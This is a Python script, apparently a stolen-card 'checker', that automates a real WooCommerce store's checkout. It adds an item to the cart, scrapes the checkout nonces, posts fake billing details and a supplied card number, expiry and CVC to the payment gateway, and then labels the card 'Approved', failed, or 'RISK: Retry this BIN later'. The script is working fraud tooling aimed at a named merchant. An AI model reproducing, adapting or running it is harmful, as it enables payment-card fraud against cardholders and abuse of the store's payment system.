def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )

def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
	mo = int(mm)
	mm = str(mo)
	if len(yy) == 2:
		yy = f"20{yy}"
	
	
	r = requests.session()
	


























































	data = MultipartEncoder({
    'quantity': (None, '1'),
    'add-to-cart': (None, '547141'),
})
	headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': data.content_type,
    'origin': 'https://cableandconnections.com',
    'priority': 'u=0, i',
    'referer': 'https://cableandconnections.com/product/shark-tooth-2-5-deep-round-box/',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
}


	response = r.post(
    'https://cableandconnections.com/product/shark-tooth-2-5-deep-round-box/',
    headers=headers,
    data=data,  #دي كانت files حولتها ل داتا
)


	headers = {
    'authority': 'cableandconnections.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'pragma': 'no-cache',
    'referer': 'https://cableandconnections.com/cart/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	response = r.get('https://cableandconnections.com/checkout/', headers=headers)

	lol = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1)

	lle = re.search(r'update_order_review_nonce":"(.*?)"', response.text).group(1)

	add = re.search(r'"address_validation_nonce":"(.*?)"', response.text).group(1)

	headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://cableandconnections.com',
    'priority': 'u=1, i',
    'referer': 'https://cableandconnections.com/checkout/',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
# دا ريكوست بتاع زر تأكيد العنوان طلعت متغير وربطته
	data = {
    'action': 'wc_avatax_validate_customer_address',
    'nonce': add,
    'type': 'billing',
    'address_1': 'HBDBFV',
    'address_2': '',
    'city': 'NEWYORK',
    'state': 'NY',
    'country': 'US',
    'postcode': '10080',
}

	response = r.post('https://cableandconnections.com/wp-admin/admin-ajax.php', headers=headers, data=data)



	headers = {
    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://cableandconnections.com',
    'priority': 'u=1, i',
    'referer': 'https://cableandconnections.com/checkout/',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

	params = {
    'wc-ajax': 'update_order_review',
}
#ضفت هنا حرف ال f
	data = f'security={lle}&payment_method=acceptbluecard&country=US&state=NY&postcode=10080-0001&city=NEWYORK&address=HBDBFV&address_2=&s_country=US&s_state=NY&s_postcode=10080-0001&s_city=NEWYORK&s_address=HBDBFV&s_address_2=&has_full_address=true&post_data=billing_email%3Dadfeaqfa%2540gmail.com%26billing_password%3D%26account_username%3D%26wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fcableandconnections.com%252F%26wc_order_attribution_session_start_time%3D2024-12-28%252000%253A21%253A10%26wc_order_attribution_session_pages%3D7%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F131.0.0.0%2520Safari%252F537.36%26billing_first_name%3DChrista%26billing_last_name%3Dafadf%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3DHBDBFV%26billing_address_2%3D%26billing_city%3DNEWYORK%26billing_state%3DNY%26billing_postcode%3D10080-0001%26billing_phone%3D9195157627%26b2bking_js_based_invalid%3D0%26b2bking_registration_roles_dropdown%3D%26b2bking_custom_field_520732%3D%26b2bking_vat_number_registration_field_number%3D520732%26shipping_first_name%3DChrista%26shipping_last_name%3Dafadf%26shipping_company%3D%26shipping_country%3DUS%26shipping_address_1%3DHBDBFV%26shipping_address_2%3D%26shipping_city%3DNEWYORK%26shipping_state%3DNY%26shipping_postcode%3D10080-0001%26order_comments%3D%26payment_method%3Dacceptbluecard%26acceptbluecard-card-name%3Dgrgfg%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{lol}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review%26shipping_method%255B0%255D%3D125188_collect_0&shipping_method%5B0%5D=125188_collect_0'

	response = r.post('https://cableandconnections.com/', params=params, headers=headers, data=data)


#2


	headers = {
    'authority': 'cableandconnections.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://cableandconnections.com',
    'pragma': 'no-cache',
    'referer': 'https://cableandconnections.com/checkout/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}


	params = {
    'wc-ajax': 'checkout',
}
# وهنا برضو كان لازم تحط f
	data = f'billing_email=moh5527vbnm%40gmail.com&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fcableandconnections.com%2Fshop%2F&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fcableandconnections.com%2Fcheckout%2F&wc_order_attribution_session_start_time=2024-12-27+23%3A53%3A27&wc_order_attribution_session_pages=5&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36&billing_first_name=bbxbcbb&billing_last_name=hhxbfbb&billing_company=&billing_country=US&billing_address_1=HBDBFV&billing_address_2=HHFHFBFV&billing_city=NEW+YORK&billing_state=NY&billing_postcode=10080-0001&billing_phone=2153652415&b2bking_js_based_invalid=0&shipping_first_name=bbxbcbb&shipping_last_name=hhxbfbb&shipping_company=&shipping_country=US&shipping_address_1=HHFHFBFV&shipping_address_2=HBDBFV&shipping_city=NEW+YORK&shipping_state=NY&shipping_postcode=10080-0001&order_comments=&payment_method=acceptbluecard&wc-acceptbluecard-payment-token=new&acceptbluecard-card-name=youssef+&acceptblue-cardnumber={n}&acceptblue-card_cvc={cvc}&acceptblue-expiry_m={mm}&acceptblue-expiry_y={yy}&terms=on&terms-field=1&woocommerce-process-checkout-nonce={lol}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&shipping_method%5B0%5D=125188_collect_0&exemption-zone='

	response = r.post('https://cableandconnections.com/', params=params, headers=headers, data=data)
	text = response.text
	pattern = r"Payment Failed with message: &#039;(.*?)&#039;"
	
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
	

